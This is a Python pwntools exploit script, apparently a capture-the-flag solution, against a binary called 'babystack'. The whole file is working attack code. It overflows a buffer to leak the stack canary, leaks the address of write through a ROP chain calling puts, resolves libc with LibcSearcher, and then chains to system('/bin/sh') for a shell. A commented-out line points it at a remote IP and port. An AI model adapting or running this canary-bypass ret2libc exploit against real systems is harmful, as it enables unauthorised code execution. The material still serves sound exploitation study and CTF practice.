#!python
#!/usr/bin/env python
#coding:utf8
 
from pwn import *
 
context.log_level = 'debug'
process_name = './babystack'
# p = process([process_name], env={'LD_LIBRARY_PATH':'./'})
# p = remote('111.198.29.45', 45404)
p = process('./babystack')
elf = ELF(process_name)
 
def get_info():
	info = p.recvline()
	log.info("info => %s", info)
	return info
 
def store_info(payload):
	p.sendlineafter('--------\n>> ', '1')
	p.sendline(payload)
	return get_info()
 
 
def print_info():
	p.sendlineafter('--------\n>> ', '2')
	return get_info()
 
def quit_program():
	p.sendlineafter('--------\n>> ', '3')
	# return get_info()
 
payload = 'A'*(0x90-8)
store_info(payload)
print_info()
canary = u64(p.recvn(7).rjust(8, '\x00'))
log.info("canary => %#x", canary)
 
 
pop_rdi_ret = 0x400a93
write_got = elf.got['write']
puts_plt = elf.plt['puts']
main_addr = 0x400908
payload = 'A'*(0x90-8) + p64(canary) + 'A'*8 + p64(pop_rdi_ret) + p64(write_got) + p64(puts_plt) + p64(main_addr)
store_info(payload)
quit_program()
write_addr = u64(p.recvn(6).ljust(8, '\x00'))
log.info("write_addr => %#x", write_addr)
 
from LibcSearcher import *
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.info("system_addr => %#x", system_addr)
log.info("binsh_addr => %#x", binsh_addr)
payload = 'A'*(0x90-8) + p64(canary) + 'A'*8 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)
store_info(payload)
quit_program()
 
 
p.interactive()
